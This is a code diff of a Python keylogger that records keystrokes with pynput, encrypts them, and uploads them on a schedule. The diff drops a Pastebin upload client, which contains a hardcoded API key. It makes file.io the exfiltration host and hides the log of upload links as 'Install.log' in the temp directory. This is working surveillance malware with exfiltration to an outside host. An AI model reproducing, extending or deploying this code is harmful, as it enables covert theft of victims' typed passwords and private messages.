@@ -7,6 +7,7 @@ from pynput.keyboard import Listener
 from urllib.request import urlopen, Request
 from sys import argv, exit
 from datetime import datetime
+from tempfile import gettempdir
 
 from apscheduler.schedulers.blocking import BlockingScheduler
 from cryptography.hazmat.backends import default_backend
@@ -14,94 +15,6 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
-class PastebinError(Exception):
-    pass
-
-class PastebinRequestError(PastebinError):
-    pass
-
-PASTEBIN_API_VERSION = '3.1'
-
-__API_LOGIN_URL = 'https://pastebin.com/api/api_login.php'
-__API_POST_URL = 'https://pastebin.com/api/api_post.php'
-
-# We have 3 valid values available which you can use with the 'api_paste_private' parameter:
-__PRIVATE_VARIANTS = {
-    'public': 0,
-    'unlisted': 1,
-    'private': 2
-}
-
-def __send_post_request_by_pastebin(url: str, params: dict) -> str:
-    """
-    :param url:
-    :param params:
-    :return:
-    """
-    params = {
-        k: v
-        for k, v in params.items()
-        if v
-    }
-    params = urlencode(params).encode('utf-8')
-
-    # POST request
-    req = Request(url, data=params)
-
-    with urlopen(req) as f:
-        if f.getcode() != 200:
-            raise PastebinRequestError('HTTP status code: ' + str(f.getcode()))
-
-        rs = f.read().decode("utf-8")
-
-        if rs.startswith('Bad API request'):
-            raise PastebinRequestError(rs)
-
-        return rs
-
-
-def __send_api_post_request(params: dict) -> str:
-    return __send_post_request_by_pastebin(__API_POST_URL, params)
-
-def paste(
-        dev_key: str,
-        code: str,
-        user_key: str = None,
-        name: str = None,
-        format: str = None,
-        private: str = None,
-        expire_date: str = "10M"
-) -> str:
-    """ Creating A New Paste
-    :param dev_key:
-    :param code:
-    :param user_key:
-    :param name:
-    :param format:
-    :param private:
-    :param expire_date:
-    :return:
-    """
-
-    if private:
-        private = __PRIVATE_VARIANTS.get(private.lower())
-
-        if private == 2 and not user_key:
-            raise PastebinError('Private paste only allowed in combination with api_user_key, '
-                                'as you have to be logged into your account to access the paste')
-
-    params = {
-        'api_dev_key': dev_key,
-        'api_option': 'paste',
-        'api_paste_code': code,
-
-        'api_user_key': user_key,
-        'api_paste_name': name,
-        'api_paste_format': format,
-        'api_paste_private': private,
-        'api_paste_expire_date': expire_date,
-    }
-    return __send_api_post_request(params)
 
 msg = ''
 
@@ -154,24 +67,16 @@ def upload():
     
     try:
         for data in encrypt_list:
-            dev_key = "2lTrhrXVkkGTuN1CKqS_j1_HgpoQ9ZRV"
-            #rs = paste(dev_key, data)
-            urls_list.append(rs) 
-            sleep(2) 
-    
-
+            url = 'https://file.io'
+            data = {"file": data}
+            response = post(url, files=data)
+            res = response.json()
+            urls_list.append(res["link"])
+            sleep(2)
     except:
-        try:
-            for data in encrypt_list:
-                url = 'https://file.io'
-                data = {"file": data}
-                response = post(url, files=data)
-                res = response.json()
-                urls_list.append(res["link"])
-                sleep(2)
-        except:
-            pass
-    f = open("Install.log", 'a')
+        pass
+    location = gettempdir() + "/Install.log"
+    f = open(location, 'a')
     for url in urls_list:
         s = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         f.write(s + "\t" + url[16:] + "\n")
